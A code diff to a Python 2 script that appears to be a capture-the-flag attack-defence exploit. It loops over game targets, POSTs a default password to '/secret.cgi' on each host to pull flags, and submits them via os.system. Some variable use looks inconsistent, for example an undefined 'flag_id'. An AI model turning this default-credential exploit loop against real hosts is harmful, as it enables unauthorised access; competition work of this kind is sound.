@@ -30,6 +30,8 @@ else:
             service_name.append(service['service_name'])
             port.append(service['service_id'])
 
+    flags = " "
+
     for elem in port:
         targets = t.get_targets(elem)
         for target in targets['targets']:
@@ -38,8 +40,9 @@ else:
             port = target['port']
             httpServ = httplib.HTTPConnection(hostname, port)
             httpServ.connect()
-            httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(note_id))
+            httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(flag_id))
             response = httpServ.getresponse().read()
             flag = response.strip().split(',')[0].strip()
-            print flag
-            t.submit_flag([flag])
+            flags += flag + " "
+            os.system("/root/code/submit {}".format(flag))
+    print flags
